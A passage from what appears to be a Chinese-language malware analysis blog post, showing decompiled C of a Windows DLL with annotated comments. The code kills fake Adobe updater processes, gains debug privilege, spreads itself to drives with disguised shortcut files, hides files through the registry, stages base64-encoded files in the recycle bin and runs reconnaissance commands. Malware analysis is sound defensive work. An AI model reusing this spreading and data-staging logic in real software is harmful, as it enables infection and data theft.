class="line">  v2[<span class="number">7</span>] = <span class="string">&#x27;d&#x27;</span>;</span><br><span class="line">  v2[<span class="number">8</span>] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">  v2[<span class="number">9</span>] = <span class="string">&#x27;t&#x27;</span>;</span><br><span class="line">  v2[<span class="number">10</span>] = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">  v2[<span class="number">11</span>] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">  v2[<span class="number">12</span>] = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">  v2[<span class="number">13</span>] = <span class="string">&#x27;x&#x27;</span>;</span><br><span class="line">  v2[<span class="number">14</span>] = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">  v2[<span class="number">15</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">  v6[<span class="number">0</span>] = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">  v6[<span class="number">1</span>] = <span class="string">&#x27;d&#x27;</span>;</span><br><span class="line">  v6[<span class="number">2</span>] = <span class="string">&#x27;o&#x27;</span>;</span><br><span class="line">  v6[<span class="number">3</span>] = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line">  v6[<span class="number">4</span>] = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">  v6[<span class="number">5</span>] = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">  v6[<span class="number">6</span>] = <span class="string">&#x27;R&#x27;</span>;</span><br><span class="line">  v6[<span class="number">7</span>] = <span class="string">&#x27;M&#x27;</span>;</span><br><span class="line">  v6[<span class="number">8</span>] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">  v6[<span class="number">9</span>] = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">  v6[<span class="number">10</span>] = <span class="string">&#x27;x&#x27;</span>;</span><br><span class="line">  v6[<span class="number">11</span>] = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">  v6[<span class="number">12</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">  v5[<span class="number">0</span>] = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">  v5[<span class="number">1</span>] = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">  v5[<span class="number">2</span>] = <span class="string">&#x27;M&#x27;</span>;</span><br><span class="line">  v5[<span class="number">3</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">  v5[<span class="number">4</span>] = <span class="string">&#x27;U&#x27;</span>;</span><br><span class="line">  v5[<span class="number">5</span>] = <span class="string">&#x27;p&#x27;</span>;</span><br><span class="line">  v5[<span class="number">6</span>] = <span class="string">&#x27;d&#x27;</span>;</span><br><span class="line">  v5[<span class="number">7</span>] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">  v5[<span class="number">8</span>] = <span class="string">&#x27;t&#x27;</span>;</span><br><span class="line">  v5[<span class="number">9</span>] = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">  v5[<span class="number">10</span>] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">  v5[<span class="number">11</span>] = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">  v5[<span class="number">12</span>] = <span class="string">&#x27;x&#x27;</span>;</span><br><span class="line">  v5[<span class="number">13</span>] = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">  v5[<span class="number">14</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">  v3[<span class="number">0</span>] = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">  v3[<span class="number">1</span>] = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">  v3[<span class="number">2</span>] = <span class="string">&#x27;M&#x27;</span>;</span><br><span class="line">  v3[<span class="number">3</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">  v3[<span class="number">4</span>] = <span class="string">&#x27;U&#x27;</span>;</span><br><span class="line">  v3[<span class="number">5</span>] = <span class="string">&#x27;p&#x27;</span>;</span><br><span class="line">  v3[<span class="number">6</span>] = <span class="string">&#x27;d&#x27;</span>;</span><br><span class="line">  v3[<span class="number">7</span>] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">  v3[<span class="number">8</span>] = <span class="string">&#x27;t&#x27;</span>;</span><br><span class="line">  v3[<span class="number">9</span>] = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">  v3[<span class="number">10</span>] = <span class="string">&#x27;s&#x27;</span>;</span><br><span class="line">  v3[<span class="number">11</span>] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">  v3[<span class="number">12</span>] = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">  v3[<span class="number">13</span>] = <span class="string">&#x27;x&#x27;</span>;</span><br><span class="line">  v3[<span class="number">14</span>] = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">  v3[<span class="number">15</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">  v7[<span class="number">0</span>] = <span class="string">&#x27;S&#x27;</span>;                                  <span class="comment">// SeDebugprivilege</span></span><br><span class="line">  v7[<span class="number">1</span>] = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">  v7[<span class="number">2</span>] = <span class="string">&#x27;D&#x27;</span>;</span><br><span class="line">  v7[<span class="number">3</span>] = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">  v7[<span class="number">4</span>] = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line">  v7[<span class="number">5</span>] = <span class="string">&#x27;u&#x27;</span>;</span><br><span class="line">  v7[<span class="number">6</span>] = <span class="string">&#x27;g&#x27;</span>;</span><br><span class="line">  v7[<span class="number">7</span>] = <span class="string">&#x27;P&#x27;</span>;</span><br><span class="line">  v7[<span class="number">8</span>] = <span class="string">&#x27;r&#x27;</span>;</span><br><span class="line">  v7[<span class="number">9</span>] = <span class="string">&#x27;i&#x27;</span>;</span><br><span class="line">  v7[<span class="number">10</span>] = <span class="string">&#x27;v&#x27;</span>;</span><br><span class="line">  v7[<span class="number">11</span>] = <span class="string">&#x27;i&#x27;</span>;</span><br><span class="line">  v7[<span class="number">12</span>] = <span class="string">&#x27;l&#x27;</span>;</span><br><span class="line">  v7[<span class="number">13</span>] = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">  v7[<span class="number">14</span>] = <span class="string">&#x27;g&#x27;</span>;</span><br><span class="line">  v7[<span class="number">15</span>] = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">  v7[<span class="number">16</span>] = <span class="number">0</span>;</span><br><span class="line">  sub_100072B0(v7, <span class="number">1</span>);                          <span class="comment">// 指定写相关的访问权的OpenProcess操作</span></span><br><span class="line">  sub_100133D0(SubStr);                         <span class="comment">// 遍历进程找到AdobeHelper.exe,关闭进程。打开进程删除注册表项</span></span><br><span class="line">  sub_100133D0(v1);                             <span class="comment">// AdobeUpdates.exe</span></span><br><span class="line">  sub_100133D0(v2);</span><br><span class="line">  sub_100133D0(v6);</span><br><span class="line">  sub_100133D0(v5);</span><br><span class="line">  sub_100133D0(v3);</span><br><span class="line">  <span class="keyword">return</span> sub_100072B0(v7, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数将AdobeHelper.exe、AdobeUpdates.exe、 AdobeUpdate.exe、AdobeARM.exe、AM Update.exe、AAM Updates.exe字符串传入sub_100133D0()函数，sub_100072B0()的功能是获得文件的写访问权。而sub_100133D0()的内容是关闭进程、遍历磁盘删除文件、删除启动项。</p><p>回到sub_100153A0()函数，后面创建了一个线程，为函数sub_10014E10()</p><h4 id="sub-10014E10"><a href="#sub-10014E10" class="headerlink" title="sub_10014E10()"></a>sub_10014E10()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __stdcall <span class="title function_">sub_10014E10</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  __int16 lpBuffer; <span class="comment">// [esp+0h] [ebp-430h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">518</span>]; <span class="comment">// [esp+2h] [ebp-42Eh] BYREF</span></span><br><span class="line">  <span class="type">wchar_t</span> pFilePath; <span class="comment">// [esp+208h] [ebp-228h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">518</span>]; <span class="comment">// [esp+20Ah] [ebp-226h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [esp+410h] [ebp-20h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [esp+414h] [ebp-1Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [esp+418h] [ebp-18h] BYREF</span></span><br><span class="line">  <span class="type">wchar_t</span> *v9; <span class="comment">// [esp+41Ch] [ebp-14h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [esp+420h] [ebp-10h]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [esp+424h] [ebp-Ch]</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [esp+428h] [ebp-8h]</span></span><br><span class="line">  __int16 *v13; <span class="comment">// [esp+42Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  exec_SetErrorMode(<span class="number">1</span>);</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  lpBuffer = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v3, <span class="number">0</span>, <span class="keyword">sizeof</span>(v3));</span><br><span class="line">  pFilePath = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v5, <span class="number">0</span>, <span class="keyword">sizeof</span>(v5));</span><br><span class="line">  v13 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    exec_memset(&amp;lpBuffer, <span class="number">0</span>, <span class="number">8</span>);</span><br><span class="line">    exec_GetLogicalDriveStringsW(<span class="number">520</span>, &amp;lpBuffer);<span class="comment">// 用指定系统中有效驱动器的字符串填充缓冲区。</span></span><br><span class="line">    v13 = &amp;lpBuffer;</span><br><span class="line">    v6 = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> ( *v13 )                              <span class="comment">// 驱动中的每个文件夹都复制自身</span></span><br><span class="line">    &#123;</span><br><span class="line">      exec_memset(&amp;pFilePath, <span class="number">0</span>, <span class="number">8</span>);</span><br><span class="line">      exec_lstrcpyW(&amp;pFilePath, <span class="string">L&quot;\\\\.\\&quot;</span>);    <span class="comment">// 匹配所有驱动器文件</span></span><br><span class="line">      exec_lstrcatW(&amp;pFilePath, v13);           <span class="comment">// 所有驱动器</span></span><br><span class="line">      v9 = exec_wcsrchr(&amp;pFilePath, <span class="string">&#x27;\\&#x27;</span>);</span><br><span class="line">      *v9 = <span class="number">0</span>;</span><br><span class="line">      v10 = CreateFile_0(&amp;pFilePath);           <span class="comment">// 创建文件</span></span><br><span class="line">      <span class="keyword">if</span> ( v10 == <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v8 = <span class="number">0</span>;</span><br><span class="line">        v7 = <span class="number">0</span>;</span><br><span class="line">        v12 = exec_CreateThread(<span class="number">0</span>, <span class="number">0</span>, sub_100151E0, &amp;pFilePath, <span class="number">0</span>, &amp;v8);<span class="comment">// 创建线程  互斥体、超级隐藏文件</span></span><br><span class="line">        <span class="keyword">if</span> ( v12 )</span><br><span class="line">        &#123;</span><br><span class="line">          exec_CloseHandle(v12);</span><br><span class="line">          v12 = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        exec_Sleep(<span class="number">100</span>);</span><br><span class="line">        v11 = exec_CreateThread(<span class="number">0</span>, <span class="number">0</span>, sub_10015030, &amp;pFilePath, <span class="number">0</span>, &amp;v7);<span class="comment">// 创建线程</span></span><br><span class="line">        <span class="keyword">if</span> ( v11 )</span><br><span class="line">        &#123;</span><br><span class="line">          exec_CloseHandle(v11);</span><br><span class="line">          v11 = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        exec_Sleep(<span class="number">1000</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      v1 = exec_lstrlenW(v13);</span><br><span class="line">      v13 += v1 + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    exec_Sleep(<span class="number">30000</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数创建了两个线程，在创建线程之前函数对整个磁盘进行遍历，并打开磁盘，之后在打开的磁盘中创建两个线程sub_100151E0()与sub_10015030()</p><h4 id="sub-100151E0"><a href="#sub-100151E0" class="headerlink" title="sub_100151E0()"></a>sub_100151E0()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __stdcall <span class="title function_">sub_100151E0</span><span class="params">(_WORD *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  WCHAR v2; <span class="comment">// [esp+0h] [ebp-430h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">518</span>]; <span class="comment">// [esp+2h] [ebp-42Eh] BYREF</span></span><br><span class="line">  <span class="type">wchar_t</span> SysId; <span class="comment">// [esp+208h] [ebp-228h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">518</span>]; <span class="comment">// [esp+20Ah] [ebp-226h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [esp+410h] [ebp-20h]</span></span><br><span class="line">  <span class="type">wchar_t</span> *v7; <span class="comment">// [esp+414h] [ebp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [esp+418h] [ebp-18h] BYREF</span></span><br><span class="line">  WCHAR pFileName; <span class="comment">// [esp+41Ch] [ebp-14h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [esp+41Eh] [ebp-12h]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [esp+422h] [ebp-Eh]</span></span><br><span class="line">  __int16 v12; <span class="comment">// [esp+426h] [ebp-Ah]</span></span><br><span class="line">  _WORD *v13; <span class="comment">// [esp+428h] [ebp-8h]</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// [esp+42Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  exec_SetErrorMode(<span class="number">1</span>);</span><br><span class="line">  v13 = a1;</span><br><span class="line">  pFileName = <span class="number">0</span>;</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  v12 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *a1 == <span class="string">&#x27;\\&#x27;</span> &amp;&amp; v13[<span class="number">1</span>] == <span class="string">&#x27;\\&#x27;</span> )</span><br><span class="line">    wsprintfW(&amp;pFileName, <span class="string">L&quot;%c:\\&quot;</span>, v13[<span class="number">4</span>]);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    wsprintfW(&amp;pFileName, <span class="string">L&quot;%ws&quot;</span>, v13);</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v3, <span class="number">0</span>, <span class="keyword">sizeof</span>(v3));</span><br><span class="line">  SysId = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v5, <span class="number">0</span>, <span class="keyword">sizeof</span>(v5));</span><br><span class="line">  exec_lstrcpyW(&amp;SysId, &amp;pFileName);</span><br><span class="line">  v7 = exec_wcsrchr(&amp;SysId, <span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">  *v7 = <span class="number">0</span>;</span><br><span class="line">  wsprintfW(&amp;v2, <span class="string">L&quot;USB_NOTIFY_INF_%ws&quot;</span>, &amp;SysId);</span><br><span class="line">  v14 = exec_CreateMutexW(<span class="number">0</span>, <span class="number">0</span>, &amp;v2);           <span class="comment">// 为驱动创建互斥体</span></span><br><span class="line">  <span class="keyword">if</span> ( exec_GetLastError() != <span class="number">0xB7</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = <span class="number">0</span>;</span><br><span class="line">    v6 = exec_CreateThread(<span class="number">0</span>, <span class="number">0</span>, sub_10013ED0, <span class="number">0</span>, <span class="number">0</span>, &amp;v8);<span class="comment">// 创建线程，设置隐藏文件注册表项</span></span><br><span class="line">    <span class="keyword">while</span> ( sub_10015E00(&amp;pFileName) != <span class="number">2</span> )     <span class="comment">// 查看网络连接。在驱动器中复制自身，并且创建伪装快捷方式文件.lnk   在回收站创建CEFHelper.exe文件</span></span><br><span class="line">      exec_Sleep(<span class="number">60000</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  exec_ReleaseMutex(v14);</span><br><span class="line">  exec_CloseHandle(v14);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数进入每个驱动器之后创建互斥体USB_NOTIFY_INF_然后创建线程，设置隐藏注册表项。在while内部的sub_10015E00()函数查看网络连接、在驱动器中复制自身，并且创建伪装快捷方式文件.lnk   在回收站创建CEFHelper.exe文件，最后释放互斥体。</p><h4 id="sub-10015030"><a href="#sub-10015030" class="headerlink" title="sub_10015030()"></a>sub_10015030()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __stdcall <span class="title function_">sub_10015030</span><span class="params">(_WORD *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  LPCWSTR v2; <span class="comment">// [esp+0h] [ebp-428h] BYREF</span></span><br><span class="line">  DWORD v3; <span class="comment">// [esp+4h] [ebp-424h]</span></span><br><span class="line">  DWORD v4; <span class="comment">// [esp+8h] [ebp-420h]</span></span><br><span class="line">  <span class="type">wchar_t</span> SysId; <span class="comment">// [esp+208h] [ebp-220h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">518</span>]; <span class="comment">// [esp+20Ah] [ebp-21Eh] BYREF</span></span><br><span class="line">  <span class="type">wchar_t</span> *v7; <span class="comment">// [esp+410h] [ebp-18h]</span></span><br><span class="line">  WCHAR pFilePath; <span class="comment">// [esp+414h] [ebp-14h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [esp+416h] [ebp-12h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [esp+41Ah] [ebp-Eh]</span></span><br><span class="line">  __int16 v11; <span class="comment">// [esp+41Eh] [ebp-Ah]</span></span><br><span class="line">  _WORD *v12; <span class="comment">// [esp+420h] [ebp-8h]</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// [esp+424h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  exec_SetErrorMode(<span class="number">1</span>);</span><br><span class="line">  v12 = a1;</span><br><span class="line">  pFilePath = <span class="number">0</span>;</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *a1 == <span class="string">&#x27;\\&#x27;</span> &amp;&amp; v12[<span class="number">1</span>] == <span class="string">&#x27;\\&#x27;</span> )</span><br><span class="line">    wsprintfW(&amp;pFilePath, <span class="string">L&quot;%c:\\&quot;</span>, v12[<span class="number">4</span>]);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    wsprintfW(&amp;pFilePath, <span class="string">L&quot;%ws&quot;</span>, v12);</span><br><span class="line">  LOWORD(v2) = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v2 + <span class="number">2</span>, <span class="number">0</span>, <span class="number">0x206</span>u);</span><br><span class="line">  SysId = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v6, <span class="number">0</span>, <span class="keyword">sizeof</span>(v6));</span><br><span class="line">  exec_lstrcpyW(&amp;SysId, &amp;pFilePath);</span><br><span class="line">  v7 = exec_wcsrchr(&amp;SysId, <span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">  *v7 = <span class="number">0</span>;</span><br><span class="line">  wsprintfW(&amp;v2, <span class="string">L&quot;USB_NOTIFY_COP_%ws&quot;</span>, &amp;SysId);<span class="comment">// 为驱动创建互斥锁</span></span><br><span class="line">  v13 = exec_CreateMutexW(<span class="number">0</span>, <span class="number">0</span>, &amp;v2);</span><br><span class="line">  <span class="keyword">if</span> ( exec_GetLastError() == <span class="number">0xB7</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    exec_ReleaseMutex(v13);</span><br><span class="line">    exec_CloseHandle(v13);</span><br><span class="line">    v13 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( InternetCheckConnectionW_0(v2, v3, v4) ) <span class="comment">// 检查网络连接https://www.microsoft.com</span></span><br><span class="line">  &#123;</span><br><span class="line">    sub_10010600(&amp;pFilePath);                   <span class="comment">// 将指定文件base64加密传到垃圾桶</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !sub_10012E60() )                      <span class="comment">// 设置Network注册表</span></span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    sub_10010BA0(&amp;pFilePath);                   <span class="comment">// 设置清空回收站注册表项，创建一个进程使用某些shell获取计算机的基本信息</span></span><br><span class="line">    sub_100123C0(&amp;pFilePath);</span><br><span class="line">  &#125;</span><br><span class="line">  exec_ReleaseMutex(v13);</span><br><span class="line">  exec_CloseHandle(v13);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同上，创建一个互斥锁，检查网络连接<a href="https://www.microsoft.com,连接正常则将某些指定格式的文件进行base64加密并传入回收站中.后面设置network的注册表为1,sub_10010ba0()函数设置清空回收站注册表项,创建一个进程使用某些shell获取计算机的基本信息(ipconfig/">https://www.microsoft.com，连接正常则将某些指定格式的文件进行base64加密并传入回收站中。后面设置Network的注册表为1，sub_10010BA0()函数设置清空回收站注册表项，创建一个进程使用某些shell获取计算机的基本信息（ipconfig</a> &#x2F;all  netstat -ano  arp -a   tasklist &#x2F;v  systeminfo）并且将文件tc3lzLmluZm8放入回收站将tmp.bat删除，并且创建进程。</p><p>回到主函数,sub_100019B0是套接字相关函数，如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __stdcall <span class="title function_">sub_100019B0</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int16 v2[<span class="number">18</span>]; <span class="comment">// [esp+0h] [ebp-64h] BYREF</span></span><br><span class="line">  __int16 v3[<span class="number">16</span>]; <span class="comment">// [esp+24h] [ebp-40h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp+44h] [ebp-20h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp+48h] [ebp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [esp+4Ch] [ebp-18h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [esp+50h] [ebp-14h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [esp+54h] [ebp-10h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [esp+58h] [ebp-Ch]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [esp+5Ch] [ebp-8h]</span></span><br><span class="line">  <span class="type">char</span> v11[<span class="number">4</span>]; <span class="comment">// [esp+60h] [ebp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  sub_1000F960();</span><br><span class="line">  v2[<span class="number">0</span>] = <span class="string">&#x27;S&#x27;</span>;</span><br><span class="line">  v2[<span class="number">1</span>] = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">  v2[<span class="number">2</span>] = <span class="string">&#x27;D&#x27;</span>;</span><br><span class="line">  v2[<span class="number">3</span>] = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">  v2[<span class="number">4</span>] = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line">  v2[<span class="number">5</span>] = <span class="string">&#x27;u&#x27;</span>;</span><br><span class="line">  v2[<span class="number">6</span>] = <span class="string">&#x27;g&#x27;</span>;</span><br><span class="line">  v2[<span class="number">7</span>] = <span class="string">&#x27;P&#x27;</span>;</span><br><span class="line">  v2[<span class="number">8</span>] = <span class="string">&#x27;r&#x27;</span>;</span><br><span class="line">  v2[<span 